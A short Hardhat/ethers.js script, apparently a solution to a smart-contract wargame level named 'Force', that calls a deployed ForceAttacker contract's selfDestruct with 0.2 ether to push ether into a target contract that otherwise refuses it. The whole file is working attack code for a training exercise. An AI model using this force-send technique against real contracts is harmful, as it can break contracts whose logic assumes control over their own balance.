const forceAttackerJson = require("../artifacts/contracts/7_ForceAttacker.sol/ForceAttacker.json");

const FORCE_ATTACKER_ADDRESS = "0xCCe6cE066F196683132e8DFe8f566E43eAd18B25";

async function main() {
  const [signer] = await ethers.getSigners();

  console.log("Executing with account:", signer.address);

  const weiAmount = (await signer.getBalance()).toString();
  
  console.log("Account balance:", (await ethers.utils.formatEther(weiAmount)));

  const forceAttackerContract = new ethers.Contract(FORCE_ATTACKER_ADDRESS, forceAttackerJson.abi, signer);

  const receipt = await forceAttackerContract.selfDestruct({ value: ethers.utils.parseEther('0.2') });

  const tx = await receipt.wait();

  console.log('tx', tx);

  console.log('done!')
}

main();